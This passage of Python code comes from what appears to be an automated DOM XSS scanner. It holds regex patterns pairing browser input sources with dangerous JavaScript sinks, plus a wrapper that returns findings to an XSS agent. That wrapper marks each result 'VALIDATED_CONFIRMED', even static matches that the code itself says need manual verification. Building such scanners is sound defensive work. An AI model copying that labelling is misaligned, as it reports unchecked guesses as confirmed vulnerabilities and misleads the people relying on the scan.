            source_sink_patterns = [
                (r'location\.search', r'document\.write(?:ln)?', 'location.search', 'document.write'),
                (r'location\.search', r'\.innerHTML\s*=', 'location.search', 'innerHTML'),
                (r'location\.search', r'eval\s*\(', 'location.search', 'eval'),
                (r'location\.search', r'\$\(.*\)\.html\s*\(', 'location.search', 'jQuery.html'),
                (r'location\.search', r'\.attr\s*\(\s*[\'"]href', 'location.search', 'jQuery.attr.href'),
                (r'location\.search', r'\.setAttribute\s*\(\s*[\'"]href', 'location.search', 'setAttribute.href'),
                (r'location\.hash', r'document\.write(?:ln)?', 'location.hash', 'document.write'),
                (r'location\.hash', r'\.innerHTML\s*=', 'location.hash', 'innerHTML'),
                (r'location\.hash', r'eval\s*\(', 'location.hash', 'eval'),
                (r'location\.hash', r'\.attr\s*\(\s*[\'"]href', 'location.hash', 'jQuery.attr.href'),
                (r'document\.referrer', r'document\.write(?:ln)?', 'document.referrer', 'document.write'),
                (r'document\.referrer', r'\.innerHTML\s*=', 'document.referrer', 'innerHTML'),
                (r'location\.href', r'document\.write(?:ln)?', 'location.href', 'document.write'),
                (r'location\.href', r'\.innerHTML\s*=', 'location.href', 'innerHTML'),
                (r'URLSearchParams', r'document\.write(?:ln)?', 'URLSearchParams', 'document.write'),
                (r'URLSearchParams', r'\.innerHTML\s*=', 'URLSearchParams', 'innerHTML'),
                (r'URLSearchParams', r'location\s*=', 'URLSearchParams', 'location'),
                (r'URLSearchParams', r'location\.href\s*=', 'URLSearchParams', 'location.href'),
                (r'URLSearchParams', r'\.attr\s*\(\s*[\'"]href', 'URLSearchParams', 'jQuery.attr.href'),
            ]

            for src_re, sink_re, src_name, sink_name in source_sink_patterns:
                if re.search(src_re, js_content) and re.search(sink_re, js_content):
                    # Found both source and sink — potential DOM XSS
                    logger.info(f"[DOMXSSDetector] Static analysis: {src_name} → {sink_name} pattern on {url}")
                    findings.append(DOMXSSFinding(
                        url=url,
                        payload="(source-to-sink pattern detected via code analysis)",
                        sink=sink_name,
                        source=src_name,
                        evidence=f"Static analysis detected {src_name} → {sink_name} pattern in JavaScript. Manual verification recommended.",
                        severity="HIGH"
                    ))
                    break  # One static finding per URL is enough — avoid noise

        except Exception as e:
            logger.debug(f"[DOMXSSDetector] Static analysis failed for {url}: {e}")

        return findings

    async def _cleanup_scan_context(self, page, context):
        """Clean up page and context resources."""
        if page:
            try:
                await page.close()
            except Exception as e:
                logger.debug(f"Error closing page: {e}")
        if context:
            try:
                await context.close()
            except Exception as e:
                logger.debug(f"Error closing context: {e}")


async def detect_dom_xss(url: str, timeout: int = 10000,
                         discovered_params: Optional[List[str]] = None) -> List[Dict[str, Any]]:
    """Convenience function for XSSAgent integration.

    Args:
        url: URL to scan for DOM XSS
        timeout: Browser timeout in ms
        discovered_params: Optional param names from specialist discovery.
                          Enables testing ?back=CANARY, ?searchTerm=CANARY etc.
    """
    async with DOMXSSDetector(timeout=timeout) as detector:
        findings = await detector.scan(url, discovered_params=discovered_params)

    return [
        {
            "vulnerability_type": "DOM_XSS",
            "url": f.url,
            "payload": f.payload,
            "sink": f.sink,
            "source": f.source,
            "evidence": f.evidence,
            "severity": f.severity,
            "status": "VALIDATED_CONFIRMED",
            "validated": True
        }
        for f in findings
    ]
